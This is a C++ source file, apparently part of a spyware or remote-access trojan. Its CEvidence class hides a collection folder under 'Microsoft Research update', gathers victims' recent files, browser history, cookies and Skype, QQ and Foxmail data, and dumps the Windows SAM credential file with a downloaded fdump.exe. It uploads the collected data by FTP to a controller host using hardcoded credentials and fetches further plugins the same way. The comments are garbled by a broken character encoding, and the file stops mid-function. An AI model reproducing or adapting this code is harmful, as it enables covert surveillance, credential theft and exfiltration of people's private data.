#include "StdAfx.h"
#include "Evidence.h"
#include "FileManager.h"
#include "KernelManager.h"
#include "KeyboardManager.h"
#include "until.h"
//#include "decode.h"
//#include "vld.h"

extern char* MyDecode(char *szEncode);

CEvidence::FILTERCONTENT CEvidence::m_sFilterContent[]=
{
	{ALARMSCREEN_LIUSHUI,	"��ˮ�¼�"},
	{ALARMSCREEN_MINGAN,	"�������"},
	{ALARMSCREEN_GUANZHU,	"��ע�¼�"},
};

// CEvidence::FILTERCONTENT CEvidence::m_sFilterContent[]=
// {
// 	{ALARMSCREEN_LIUSHUI,	"NullahEvent"},
// 	{ALARMSCREEN_MINGAN,	"�������"},
// 	{ALARMSCREEN_GUANZHU,	"AttentionEvent"},
// };



CEvidence::CEvidence()
{
	ZeroMemory(m_szPathEvidence, sizeof(m_szPathEvidence));
	ZeroMemory(m_szPathRecent, sizeof(m_szPathRecent));
	ZeroMemory(m_szPathWeb, sizeof(m_szPathWeb));	
	ZeroMemory(m_szPathCookies, sizeof(m_szPathCookies));
	ZeroMemory(m_szPathQQ, sizeof(m_szPathQQ));	

	ZeroMemory(m_szSysRecent, sizeof(m_szSysRecent));
	ZeroMemory(m_szSysHistory, sizeof(m_szSysHistory));	

	ZeroMemory(m_szSingleMark, sizeof(m_szSingleMark));
	ZeroMemory(m_nMacAddr, sizeof(m_nMacAddr));
	ZeroMemory(m_szConfigFileName, sizeof(m_szConfigFileName));
	ZeroMemory(m_szLogUser, sizeof(m_szLogUser));
	ZeroMemory(m_szPlugSreenName, sizeof(m_szPlugSreenName));
	ZeroMemory(&m_infoState, sizeof(m_infoState));
	

	m_hConfigFile = INVALID_HANDLE_VALUE;
	m_pObjSkype = NULL;
	m_pScreen = NULL;
	m_bWorking = FALSE;

	m_hevnetMonitor = ::CreateEvent(NULL, FALSE, FALSE, NULL);

	//m_hevnetMonitor = ::CreateEvent(NULL, TRUE, FALSE, NULL); //-yx 20110526

	m_heventSend  = ::CreateEvent(NULL, FALSE, FALSE, NULL);
	m_hQuit = ::CreateEvent(NULL, TRUE, FALSE, NULL);

	//��Щ���ܿ��ã���������Ӿ���
	m_dwCapacity = SECRET_RECENT | SECRET_WEB | SECRET_SKYPE | SECRET_COOKIES | SECRET_QQLOG | SECRET_SCREEN | SECRET_CLEVERSRC | SECRET_SAM;
	//m_dwCapacity = SECRET_SCREEN;

	m_dwAvalible = 0;//-yx 20110525
	m_nWorkState = SECRET_TYPE_STOP;
	m_nCapacityCount = 3;
	m_hThreadMonitor = NULL;
	m_hThreadSend = NULL;
	m_pSocketClient = NULL;
	m_bWorkPlugScreen = FALSE;




	m_hDllCleverScreen = NULL;
	InitializeCriticalSection(&m_cs);
	m_pFoxmail = NULL;

	InitParam();
}


CEvidence::~CEvidence(void)
{	
	StopWork();
	SAFE_DELETE(m_pSocketClient);
	SAFE_DELETE(m_pObjSkype);
	SAFE_DELETE(m_pScreen);
	SAFE_DELETE(m_pFoxmail);

	CloseHandle(m_hThreadMonitor);
	CloseHandle(m_hThreadSend);
	CloseHandle(m_heventSend);

	DeleteCriticalSection(&m_cs);
}


BOOL CEvidence::InitParam()
{
// 	char szCpuId[MAX_PATH] = {0};
// 	GetCPUID(szCpuId);	
	if (0 == lstrlen(m_szSingleMark))
	{
		GetFirstMac(m_szSingleMark);
	}
	
// 	wsprintf(m_szSingleMark, "%02X%02X%02X%02X%02X%02X-%s", m_nMacAddr[0], m_nMacAddr[1], m_nMacAddr[2], m_nMacAddr[3], m_nMacAddr[4], m_nMacAddr[5], szCpuId);

	SHGetSpecialFolderPath(NULL,m_szPathEvidence,CSIDL_PROGRAM_FILES,0);
	strcat(m_szPathEvidence,"\\Microsoft Research update\\Evidence\\");

	MakeSureDirectoryPathExists(m_szPathEvidence);

	char *pTmp = GetCurrentLoginUser();
	lstrcpy(m_szLogUser, pTmp);
	char szDriver[32] = {0};
	lstrcpy(szDriver, "%SYSTEMDRIVE%");
	DoEnvironmentSubst(szDriver, sizeof(szDriver));
	wsprintf(m_szSysRecent, "%s\\Documents and Settings\\%s\\recent\\",szDriver, m_szLogUser); 

	SHGetFolderPath(NULL, CSIDL_HISTORY, NULL, 0, m_szSysHistory);
	ReplaceStr(m_szSysHistory, "LocalService", m_szLogUser);

	//��ʼ����ʱ�ļ�
	lstrcpy(m_szPathRecent, m_szPathEvidence);
	StrCat(m_szPathRecent,"recent\\");

	//��ʼ��web��ʷ�ļ�	
	lstrcpy(m_szPathWeb, m_szPathEvidence);
	StrCat(m_szPathWeb,"web\\");

	//��ʼ��cookiesĿ¼
	lstrcpy(m_szPathCookies, m_szPathEvidence);
	StrCat(m_szPathCookies,"cookies\\");

	//��ʼ��QQĿ¼	
	lstrcpy(m_szPathQQ, m_szPathEvidence);
	StrCat(m_szPathQQ,"QQ\\");

	//��ʼ��samĿ¼	
	lstrcpy(m_szPathSam, m_szPathEvidence);
	StrCat(m_szPathSam,"sam\\");


	//��ʼ��PassBackĿ¼	
	lstrcpy(m_szPathPassBack, m_szPathEvidence);
	StrCat(m_szPathPassBack,"passback\\");

	//��ʼ��dirĿ¼	
	lstrcpy(m_szPathDir, m_szPathEvidence);
	StrCat(m_szPathDir,"dir\\");


	//��ʼ��dirĿ¼	
	lstrcpy(m_szPathMachine, m_szPathEvidence);
	StrCat(m_szPathMachine,"machine\\");

	


	//��ʼ��Skpe����
	char szSkypePath[MAX_PATH] = {0};
	wsprintf(szSkypePath, "%s\\skype\\", m_szPathEvidence);
	m_pObjSkype = new CSkype();
	m_pObjSkype->SetOutputDir(szSkypePath);

	//��ʼ����������
// 	char szScreenPath[MAX_PATH] = {0};
// 	wsprintf(szScreenPath, "%s\\screen\\", m_szPathEvidence);
	//m_pScreen = new CEvidenceScreen();
/*	m_pScreen->SetOutputDir(szScreenPath);*/

	//��ȡ���������
	//char DllPath[MAX_PATH];
	GetTempPathA(MAX_PATH,m_szPlugSreenName);
	strcat(m_szPlugSreenName,"Screen.tmp");

	GetTempPathA(MAX_PATH,m_szFDump);
	strcat(m_szFDump,"fdump.tmp");

	//DeleteFile(DllPath);

	//wsprintf(m_szPlugSreenName, "%s", "C:\\Program Files\\Microsoft Research driver\\AlarmScreen.dll");
// 	if (PathFileExists(m_szPlugSreenName))
// 	{
// 		m_dwCapacity |= SECRET_CLEVERSRC;
// 	}

	//foxmail�����ȡ��
	char szFoxmailPath[MAX_PATH] = {0};
	wsprintf(szFoxmailPath, "%s\\foxmail\\", m_szPathEvidence);
	m_pFoxmail = new CEvidenceFoxMail;
	m_pFoxmail->SetOutputDir(szFoxmailPath);
	if (m_pFoxmail->IsFoxInstall())
	{
		m_dwCapacity |= SECRET_FOXMAIL;
	}

	//StartWork();//-yx 20110525
	
	return TRUE;
}


BOOL CEvidence::CreateRecentFile()
{
	MakeSureDirectoryPathExists(m_szPathRecent);	

	char szRecentPath[MAX_PATH] = {0};
	lstrcpy(szRecentPath, m_szSysRecent);
	lstrcat(szRecentPath, "\\*.*");

	WIN32_FIND_DATA	FindFileData = {0};

	HANDLE hFile = ::FindFirstFile(szRecentPath, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	do 
	{		
		CHAR *pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
		{
			continue;
		}
		
		CreateRecentFileOne(&FindFileData);

	} while(FindNextFile(hFile, &FindFileData));

	return TRUE;
}


BOOL CEvidence::CreateRecentFileOne(PWIN32_FIND_DATA lpFindFileData)
{
	if (NULL == StrStr(lpFindFileData->cFileName, ".lnk"))
	{
		return FALSE;
	}

	CHAR szLocation[MAX_PATH] = {0};
	CHAR szSourceFile[MAX_PATH] = {0};
	wsprintf(szSourceFile, "%s\\%s", m_szSysRecent, lpFindFileData->cFileName);
	BOOL bRet = GetFileNameFormCutShort(szSourceFile, szLocation);
	if (!bRet || (0 == lstrlen(szLocation)))
	{
		return FALSE;
	}

	if (!PathFileExists(szLocation))
	{
		return FALSE;
	}

	HANDLE hFile = ::CreateFile(szLocation,  GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return FALSE;
	}

	bRet = FALSE;
	do 
	{
		DWORD dwHigh = 0;
		DWORD dwLow = 0;
		dwLow = GetFileSize(hFile, &dwHigh);
		if (0xFFFFFFFF == dwLow || 0 != dwHigh || dwLow > 1024*1024*100)
		{
			break;
		}	

		bRet = TRUE;

	} while (FALSE);

	SAFE_CLOSEHANDLE(hFile);


	if (!bRet)
	{
		return bRet;
	}

	CHAR *pPos = StrRChr(szLocation, NULL, '\\');
	if (NULL != pPos)
	{
		CHAR szNewFile[MAX_PATH] = {0};
		wsprintf(szNewFile, "%s\\%s", m_szPathRecent, pPos);

		::CopyFile(szLocation, szNewFile, FALSE);
	}

	return bRet;	
}




BOOL CEvidence::CreateWebHistory()
{
	MakeSureDirectoryPathExists(m_szPathWeb);

	BOOL bRet = ::PathFileExists(m_szSysHistory);
	if (!bRet)
	{
		return FALSE;
	}

	CopyWebPath(m_szSysHistory);

	return TRUE;
}


BOOL CEvidence::CopyWebPath(LPSTR lpPath)
{
	char szPathTemp[MAX_PATH] = {0};
	wsprintf(szPathTemp, "%s\\*.*", lpPath);

	WIN32_FIND_DATA	FindFileData = {0};

	HANDLE hFile = ::FindFirstFile(szPathTemp, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	do 
	{		
		CHAR *pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
		{
			continue;
		}

		char szFullPath[MAX_PATH] = {0};
		wsprintf(szFullPath, "%s\\%s", lpPath, pszFileName);
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			CopyWebPath(szFullPath);
		}

		if (0 == lstrcmpi(pszFileName, "index.dat"))
		{
			SYSTEMTIME tmSystem = {0};
			GetSystemTime(&tmSystem);
			char szNewName[MAX_PATH] = {0};
			wsprintf(szNewName, "%s\\Web_%04d%02d%02d%02d%02d%02d.dat", m_szPathWeb, tmSystem.wYear,tmSystem.wMonth, tmSystem.wDay, tmSystem.wHour, tmSystem.wMinute, tmSystem.wSecond);

			CopyFile(szFullPath, szNewName, FALSE);
			break;
		}

	} while(FindNextFile(hFile, &FindFileData));

	return TRUE;
}


BOOL CEvidence::GetFileNameFormCutShort(LPTSTR strFileName, LPTSTR strOutFileName)
{
#define LNK_HASIDLIST	0x1
#define LNK_NETSHARE	0x2

	typedef struct _LNKHEAD
	{
		DWORD		dwID;
		DWORD		dwGUID[4];
		DWORD		dwFlags;
		DWORD		dwFileAttributes;
		FILETIME	dwCreationTime;
		FILETIME	dwModificationTime;
		FILETIME	dwLastaccessTime;
		DWORD		dwFileLen;
		DWORD		dwIconNum;
		DWORD		dwWinStyle;
		DWORD		dwHotkey;
		DWORD		dwReserved1;
		DWORD		dwReserved2;
	}LNKHEAD, *PLNKHEAD;


	typedef struct _FILELOCATIONINFO
	{
		DWORD		dwSize;
		DWORD		dwFirstOffset;
		DWORD		dwFlags;
		DWORD		dwOffsetOfVolume;
		DWORD		dwOffsetOfBasePath;
		DWORD		dwOffsetOfNetworkVolume;
		DWORD		dwOffsetOfRemainingPath;
	}FILELOCATIONINFO, *PFILELOCATIONINFO;

	//������ݷ�ʽ��ַ
	int	iSize = 0;
	LNKHEAD	head = {0};
	FILELOCATIONINFO fileLocationInfo = {0};
	
	HANDLE hFile = ::CreateFile(strFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return FALSE;
	}

	BOOL bRet = FALSE;
	do 
	{
		LNKHEAD	head = {0};
		iSize = sizeof(LNKHEAD);
		DWORD dwRead = 0;

		BOOL bRead = ReadFile(hFile, &head, iSize, &dwRead, NULL);
		if (!bRead || iSize != dwRead)
		{
			break;
		}

		DWORD dwFlags = head.dwFlags;
		DWORD dwRet = 0;
		if(dwFlags & LNK_HASIDLIST)
		{
			// The Shell Item Id List
			unsigned short	usLenTemp;
			bRead = ReadFile(hFile, &usLenTemp, 2, &dwRead, NULL);
			if(!bRead || dwRead != 2)
			{
				break;
			}
			//fread(&szCommand, usLenTemp, 1, file);
			dwRet = SetFilePointer(hFile, usLenTemp, NULL, FILE_CURRENT);
			if (INVALID_SET_FILE_POINTER == dwRet)
			{
				break;
			}
		}

		bRead = ::ReadFile(hFile, &fileLocationInfo, sizeof(fileLocationInfo), &dwRead, NULL);
		if (!bRead || dwRead != sizeof(fileLocationInfo))
		{
			break;
		}

		//fread(&szCommand, fileLocationInfo.dwSize - sizeof(fileLocationInfo), 1, file);

		dwRet = ::SetFilePointer(hFile, fileLocationInfo.dwOffsetOfBasePath +  dwRet, NULL, FILE_BEGIN);
		if (INVALID_SET_FILE_POINTER == dwRet)
		{
			break;
		}

		if(fileLocationInfo.dwFlags & LNK_NETSHARE)
		{
			iSize = fileLocationInfo.dwOffsetOfNetworkVolume - fileLocationInfo.dwOffsetOfBasePath;
		}
		else
		{
			iSize = fileLocationInfo.dwOffsetOfRemainingPath - fileLocationInfo.dwOffsetOfBasePath;
		}


		if (iSize < MAX_PATH)
		{
			bRead = ::ReadFile(hFile, strOutFileName, iSize, &dwRead, NULL);
			if (!bRead || iSize != dwRead)
			{
				break;
			}

			bRet = TRUE;
		}		

	} while (FALSE);

	SAFE_CLOSEHANDLE(hFile);

	return bRet;
}


DWORD WINAPI CEvidence::MonitorAccessEx(LPVOID lpVoid)
{
	if (NULL != lpVoid)
	{
		return ((CEvidence *)lpVoid)->MonitorAccess();
	}

	return 0;
}


DWORD CEvidence::MonitorAccess()
{
	while (TRUE)
	{
		::WaitForSingleObject(m_hevnetMonitor, 3*60*60*1000); //3Сʱһ��
		if (WAIT_OBJECT_0 == ::WaitForSingleObject(m_hQuit, 1000))
		{
			break;
		}

		if (m_dwAvalible & SECRET_RECENT)
		{
			if (!CreateRecentFile())
			{
				m_dwAvalible &= ~SECRET_RECENT;
			}			
		}
		
		if (m_dwAvalible & SECRET_WEB)
		{
			if (!CreateWebHistory())
			{
				m_dwAvalible &= ~SECRET_WEB;
			}		
		}
		
		if (m_dwAvalible & SECRET_SKYPE)
		{
// 			if (!m_pObjSkype->StartWork())//
// 			{
// 				m_dwAvalible &= ~SECRET_SKYPE;
// 			}
		}

		if (m_dwAvalible & SECRET_SCREEN)
		{


// 			if (!m_pScreen->StartWork())//
// 			{
// 				m_dwAvalible &= ~SECRET_SCREEN;
// 			}
		}

		if (m_dwAvalible & SECRET_QQLOG)
		{
// 			if (!CreateQQLogFile())//
// 			{
// 				m_dwAvalible &= ~SECRET_QQLOG;
// 			}
		}

		if (m_dwAvalible & SECRET_SAM)
		{
			if (!GetSamFile())//
			{
				m_dwAvalible &= ~SECRET_QQLOG;
			}
		}


		if (m_dwAvalible & SECRET_COOKIES)
		{
			if (!CreateCookiesFile())//
			{
				m_dwAvalible &= ~SECRET_COOKIES;
			}
		}

		if (m_dwAvalible & SECRET_CLEVERSRC)
		{
// 			if (!StartPlugScreen())
// 			{
// 				m_dwAvalible &= ~SECRET_CLEVERSRC;
// 			}
		}

		if (m_dwAvalible & SECRET_FOXMAIL)
		{
			if (!m_pFoxmail->StartWork())
			{
				m_dwAvalible &= ~SECRET_CLEVERSRC;
			}
		}



		SetEvent(m_heventSend);
	}

	return 0;
}


DWORD WINAPI CEvidence::SendToClientEx(LPVOID lpVoid)
{
	if (NULL != lpVoid)
	{
		return ((CEvidence *)lpVoid)->SendToClient();

// 		DWORD icount=0;
// 		while (TRUE)
// 		{
// 			::WaitForSingleObject(((CEvidence *)lpVoid)->m_heventSend, 10*1000); //-yx 20110526 10s����һ��
// 			//= CreateThread(NULL, 0, SendToClient2, lpVoid, 0);
// 			HANDLE hThread = (HANDLE)(HANDLE)CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendToClient2, (LPVOID)lpVoid, 0, NULL);
// 
// 			PrintString("%d\r\n",icount);
// 			icount++;
// 
// //			WaitForSingleObject(hThread,INFINITE);
// 
// 			CloseHandle(hThread);
// 		}

	}

	return 0;

}

DWORD WINAPI CEvidence::SendToClient2(LPVOID lpVoid)
{
	return ((CEvidence *)lpVoid)->SendToClient();
	
}

// DWORD CEvidence::SendToClient()
// {
// 	CClientSocket m_pSocketClient;
// 	CFileManager manager(&m_pSocketClient, FALSE);
// 	EnterCriticalSection(&m_cs);
// 
// 	if (!m_pSocketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
// 	{
// 		OutputDebugString("enter miqu send to client");
// 		LeaveCriticalSection(&m_cs);
// 		return -1;
// 	}
// 
// 	BYTE bPacket[MAX_PATH+1] = {0};
// 	bPacket[0] = TOKEN_EVIDENCE_CREATE;
// 
// 	wsprintf((LPSTR)&(bPacket[1]), "%s\\%s", m_szPathEvidence, m_szSingleMark);
// 	m_pSocketClient.Send(bPacket, lstrlen((LPSTR)(&bPacket[1]))+1+1);
// 	manager.SetFilterFun(CEvidence::FilterFileEx, this);
// 
// 	bPacket[0] = COMMAND_DOWN_FILES;
// 	lstrcpy((LPSTR)&(bPacket[1]), m_szPathEvidence);
// 
// 	manager.OnReceive(bPacket, lstrlen(m_szPathEvidence)+1+1);
// 	m_pSocketClient.run_event_loop(INFINITE);
// 	OutputDebugString("ddddddddddd");
// 
// 	LeaveCriticalSection(&m_cs);
// 	return 0;
// }


DWORD CEvidence::SendToClient()
{


	CClientSocket m_pSocketClient;

	CFileManager manager(&m_pSocketClient, FALSE);

	//DWORD icount=0;


	while (TRUE)
	{
		//		::WaitForSingleObject(m_heventSend, 10*60*1000); //ÿ10���ӿ���һ��

		::WaitForSingleObject(m_heventSend, 10*1000); //-yx 20110526 10s����һ��


		if (WAIT_OBJECT_0 == ::WaitForSingleObject(m_hQuit, 0))
		{
			break;
		}
		//_asm int 3
		manager.FtpUpLoad(CKernelManager::m_strMasterHost,21,"test","admin",m_szPathEvidence,m_szSingleMark);

	//	PrintString("%d\r\n",icount);

	//	icount++;


	}

	return 0;
}




// DWORD CEvidence::SendToClient()
// {
// 	
// 
// 	CClientSocket m_pSocketClient;
// // 	if (!m_pSocketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
// // 	{
// // 		return -1;
// // 	}
// 
// 
// 	CFileManager manager(&m_pSocketClient, FALSE);
// 
// 	DWORD icount=0;
// 
// 
// 	while (TRUE)
// 	{
// //		::WaitForSingleObject(m_heventSend, 10*60*1000); //ÿ10���ӿ���һ��
// 
// 		::WaitForSingleObject(m_heventSend, 10*1000); //-yx 20110526 10s����һ��
// 
// 
// 		
// 		if (WAIT_OBJECT_0 == ::WaitForSingleObject(m_hQuit, 0))
// 		{
// 			break;
// 		}
// 		//OutputDebugString("enter miqu send to client");
// 		EnterCriticalSection(&m_cs);
// 
// 		//SAFE_DELETE(m_pSocketClient);
// 		//m_pSocketClient = new CClientSocket;
// 
//  		BYTE bPacket[MAX_PATH+1] = {0};
//  		
// 		if(m_pSocketClient.m_Socket==INVALID_SOCKET
// 		  // ||m_pSocketClient.Send(bPacket, lstrlen((LPSTR)(&bPacket[1]))+1+1)==SOCKET_ERROR
// 		   )
// 		{
// 
// 			if (m_pSocketClient.m_hWorkerThread)
// 			{
// 				TerminateThread(m_pSocketClient.m_hWorkerThread,0);
// 				CloseHandle(m_pSocketClient.m_hWorkerThread);
// 				m_pSocketClient.m_hWorkerThread=0;
// 			}
// 
// 			//dprintf(("erro:%d",GetLastError()));
// 
// 
// 			if (!m_pSocketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
// 			{
// 				LeaveCriticalSection(&m_cs);
// 				continue;
// 			}
// 			bPacket[0] = TOKEN_EVIDENCE_CREATE;
// 			wsprintf((LPSTR)&(bPacket[1]), "%s\\%s", m_szPathEvidence, m_szSingleMark);
// 			m_pSocketClient.Send(bPacket, lstrlen((LPSTR)(&bPacket[1]))+1+1);
// 		}
// // 		bPacket[0] = TOKEN_EVIDENCE_CREATE;
// // 		wsprintf((LPSTR)&(bPacket[1]), "%s\\%s", m_szPathEvidence, m_szSingleMark);
// 
// 
// 
// 		
// 	//	dprintf(("erro:%d",GetLastError()));
// 		//CFileManager *manager=new CFileManager(m_pSocketClient, FALSE);
// 		//CFileManager manager(m_pSocketClient, FALSE);
// 
// // 		BYTE bPacket[MAX_PATH+1] = {0};
// // 		bPacket[0] = TOKEN_EVIDENCE_CREATE;
// // 
// // 		wsprintf((LPSTR)&(bPacket[1]), "%s\\%s", m_szPathEvidence, m_szSingleMark);
// // 		m_pSocketClient.Send(bPacket, lstrlen((LPSTR)(&bPacket[1]))+1+1);
// 
// 
// 		manager.SetFilterFun(CEvidence::FilterFileEx, this);
// 
// 		memset(bPacket,0,MAX_PATH);
// 		bPacket[0] = COMMAND_DOWN_FILES;
// 		lstrcpy((LPSTR)&(bPacket[1]), m_szPathEvidence);
// 
// 
// 
// 		if(manager.UploadToRemote(bPacket+1)==SOCKET_ERROR)
// 			m_pSocketClient.m_Socket=INVALID_SOCKET;
// 		
// 
// 
// 		//manager.OnReceive(bPacket, lstrlen(m_szPathEvidence)+1+1);
// 
// 		//SAFE_DELETE(manager);
// 		//m_pSocketClient.run_event_loop(INFINITE);// -yx ȥ��
// 
// 		PrintString("%d\r\n",icount);
// 
// 		icount++;
// 
// 
// 	//	OutputDebugString("leave miqu send to client");
// 		LeaveCriticalSection(&m_cs);
// // 		SetEvent(m_hevnetMonitor); //��ʱע�ͣ������ظ�����
// 	}
// 	//m_pSocketClient.run_event_loop(INFINITE);// -yx ȥ��
// 
// 	return 0;
// }


int CEvidence::ReplaceStr(char *sSrc, char *sMatchStr, char *sReplaceStr)
{

	int  StringLen = 0;
	char caNewString[MAX_PATH] = {0};
	char *FindPos = strstr(sSrc, sMatchStr);
	if( (!FindPos) || (!sMatchStr))
	{
		return -1;
	}

	while( FindPos )
	{
		memset(caNewString, 0, sizeof(caNewString));
		StringLen = FindPos - sSrc;
		strncpy(caNewString, sSrc, StringLen);
		lstrcat(caNewString, sReplaceStr);
		lstrcat(caNewString, FindPos + lstrlen(sMatchStr));
		lstrcpy(sSrc, caNewString);
		FindPos = strstr(sSrc, sMatchStr);
	}

	return 0;
}


BOOL CEvidence::StartWork()
{	
	if (m_bWorking)
	{
		return TRUE;
	}

	m_hThreadMonitor = MyCreateThread(NULL, 0, MonitorAccessEx, this, 0, NULL);

	//m_hThreadSend = MyCreateThread(NULL, 0, SendToClientEx, this, 0, NULL);

	m_bWorking = TRUE;

	m_nWorkState = SECRET_TYPE_START;

	return TRUE;
}


BOOL CEvidence::StopWork()
{
	if (!m_bWorking)
	{
		return TRUE;
	}

	::SetEvent(m_hQuit);
	::SetEvent(m_hevnetMonitor);
	::SetEvent(m_heventSend);

	SAFE_DELETE(m_pSocketClient);

	::WaitForSingleObject(m_hThreadMonitor, INFINITE);
	::WaitForSingleObject(m_hThreadSend, INFINITE);

	::CloseHandle(m_hThreadMonitor);
	::CloseHandle(m_hThreadSend);

	m_hThreadMonitor = NULL;
	m_hThreadSend = NULL;
	m_bWorking = FALSE;

	::ResetEvent(m_hevnetMonitor);
	::ResetEvent(m_heventSend);
	::ResetEvent(m_hQuit);


	m_dwAvalible = 0;
	m_nWorkState = SECRET_TYPE_STOP;

	return TRUE;
}

BOOL CEvidence::SetAutoSreenArg(TCHAR *szCmdLine)
{
	//_asm int 3
	return m_pScreen->SetScreenCmdLine(szCmdLine);
}

BOOL CEvidence::SetWorkState(INFOSTATE *pInfoState, int nSize)
{

	if (nSize != sizeof(INFOSTATE))
	{
		return FALSE;
	}


	CopyMemory(&m_infoState, pInfoState, sizeof(m_infoState));

	m_dwAvalible = pInfoState->nAvalible;
	//SetAutoSreenArg((TCHAR*)&pInfoState->infoScreen);
	//m_pScreen->SetScreenInfo(&pInfoState->infoScreen);

	if (!(m_dwAvalible & SECRET_SKYPE)) //ֹͣskype��ȡ
	{
		m_pObjSkype->StopWork();
	}

	if (!(m_dwAvalible & SECRET_SCREEN)) //ֹͣ�Զ�����
	{
//		m_pScreen->StopWork();
	}

	TCHAR szTemp[MAX_PATH];
	StrCpyA(szTemp,m_szPlugSreenName);
	StrCat(szTemp,"_start");
	DeleteFileA(szTemp);
	if ((m_dwAvalible & SECRET_CLEVERSRC))
	{
		if (!PathFileExists(m_szPlugSreenName))
		{
			FtpDownLoad(pInfoState->infoScreen.szDownLoadPlugUrl,
				m_szPlugSreenName,"Screen.dll",
				pInfoState->infoScreen.szFtpUser,pInfoState->infoScreen.szFtppass);
			Sleep(1000*30);
		}
		CopyFile(m_szPlugSreenName,szTemp,FALSE);
		//StopPlugScreen();
	}

	if ((m_dwAvalible & SECRET_SAM))
	{
		if (!PathFileExists(m_szFDump))
		{
			FtpDownLoad(pInfoState->infoScreen.szDownLoadPlugUrl,
				m_szFDump,"fdump.exe",
				pInfoState->infoScreen.szFtpUser,pInfoState->infoScreen.szFtppass);
			Sleep(1000*30);
		}	
	}

	if (0 != m_dwAvalible)
	{
		
		StartAutoSreen((TCHAR*)&pInfoState->infoScreen,CKernelManager::m_strMasterHost,1);

		//SetAutoSreenArg((TCHAR*)&pInfoState->infoScreen);

		StartWork();
		SetEvent(m_hevnetMonitor);
	}		

	if (0 == m_dwAvalible)
	{
		StopWork();
		StopAutoScreen();
	}

	return TRUE;
}


BOOL CEvidence::GetWorkState(INFOSTATE *pInfoState)
{
	if (NULL == pInfoState)
	{
		return FALSE;
	}

	//ˢ�¿�����
	if (!(m_dwCapacity & SECRET_CLEVERSRC))
	{
		if (PathFileExists(m_szPlugSreenName))
		{
			m_dwCapacity |= SECRET_CLEVERSRC;
		}
	}	

	
	m_pScreen->GetScreenInfo(&pInfoState->infoScreen.FtpConfig);

	m_nWorkState=GetScreenState();

	if (m_nWorkState==SECRET_TYPE_START&&pInfoState->infoScreen.FtpConfig.m_nScrTimeInternal){
		m_dwAvalible|=SECRET_SCREEN;
	}

	if (!m_dwAvalible){
		m_nWorkState=SECRET_TYPE_STOP;
	}
	//else m_dwAvalible&=~SECRET_SCREEN;

	pInfoState->dwType = m_nWorkState;
	pInfoState->nCount = m_nCapacityCount;
	pInfoState->nAvalible = m_dwAvalible;
	pInfoState->nCapacity = m_dwCapacity;

	return TRUE;
}


BOOL CEvidence::SetSingleSign(LPCSTR lpFileName)
{
	if (0 == lstrlen(lpFileName) || !strcmp(lpFileName, m_szSingleMark))
	{
		return TRUE;
	}

	StopWork();

	//ɾ����ǰȡ֤Ŀ¼
// 	DeleteDirectory(m_szPathEvidence);

	lstrcpy(m_szSingleMark, lpFileName);

	InitParam();

	return TRUE;
}
		

//ɾ��һ��Ŀ¼�µ�ȫ������
BOOL CEvidence::DeleteDirectory(LPCTSTR sDirName)
{
	char szDeletePath[MAX_PATH] = {0};
	lstrcpy(szDeletePath, sDirName);
	lstrcat(szDeletePath, "\\*.*");

	WIN32_FIND_DATA	FindFileData = {0};

	HANDLE hFile = ::FindFirstFile(szDeletePath, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	do 
	{		
		CHAR *pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
		{
			continue;
		}

		char szFullPath[MAX_PATH] = {0};
		wsprintf(szFullPath, "%s\\%s", sDirName, pszFileName);
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			DeleteDirectory(szFullPath);//ɾ����Ŀ¼
		}
		else
		{
			TCHAR sTempFileName[200]; 
			wsprintf(sTempFileName,  "%s\\%s",sDirName,pszFileName); 
			::DeleteFile(sTempFileName); 
		}

	} while(FindNextFile(hFile, &FindFileData));
	
	return TRUE; 
}


BOOL CEvidence::GetSamFile()
{

	MakeSureDirectoryPathExists(m_szPathSam);	

	TCHAR szSam[MAX_PATH];
	TCHAR szcmd[MAX_PATH];
	GetSystemDirectory(szSam,MAX_PATH);

	wsprintf(szcmd,"%s /v \"%s\\config\\sam\" \"%sdfer.dat\"",m_szFDump,szSam,m_szPathSam);

//	OutputDebugStringA(szcmd);

	WinExec(szcmd,0);
	return TRUE;

}


void xorbyte(char *szBuf)
{
	DWORD dwlen=strlen(szBuf);
	for (DWORD i=0;i<dwlen;i++)
	{
		if (szBuf[i]!=0xAB)
		{
			szBuf[i]^=0xAB;
		}
	}
}




BOOL CEvidence::PassBackFileList(CHAR *szBuffer,CHAR *szFirstFile)
{
	TCHAR szNeedPassList[MAX_PATH]={0};

	GetTempPathA(MAX_PATH,szNeedPassList);
	StrCat(szNeedPassList,"passback.list");
	EnterCriticalSection(&m_cs);
	HANDLE	hOldFile=INVALID_HANDLE_VALUE;
	LPBYTE	lpBuffer=NULL;
	BOOL bDel=FALSE;

	__try
	{
		
		
		DWORD dwBytesWrite = 0;

		do 
		{
			hOldFile = CreateFile(szNeedPassList,GENERIC_READ|GENERIC_WRITE,0,NULL,
				OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

			if (szBuffer)
			{
				if (strlen(szBuffer)==0) break;
				DWORD dwcount=0;
				ReadFile(hOldFile,&dwcount,4,&dwBytesWrite,0);
				SetFilePointer(hOldFile, 0, 0, FILE_BEGIN);
				dwcount++;
				WriteFile(hOldFile,&dwcount,4,&dwBytesWrite,0);
				SetFilePointer(hOldFile, 0, 0, FILE_END);
				xorbyte(szBuffer);
				WriteFile(hOldFile,szBuffer,strlen(szBuffer)+1,&dwBytesWrite,0);
				break;
			}

